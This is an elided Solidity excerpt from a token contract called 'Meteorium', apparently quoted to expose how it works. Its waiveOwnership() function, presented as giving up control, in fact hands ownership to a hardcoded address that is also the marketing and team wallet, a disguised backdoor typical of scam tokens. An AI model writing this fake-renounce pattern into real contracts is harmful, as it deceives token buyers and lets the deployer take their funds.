...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xbc5Ff58f820E7d588622b0C2121905BFf0225f87);
    }
...
contract Meteorium is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Meteorium";
    string private _symbol = "Meteorium";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xbc5Ff58f820E7d588622b0C2121905BFf0225f87);
    address payable private teamWalletAddress = payable(0xbc5Ff58f820E7d588622b0C2121905BFf0225f87);
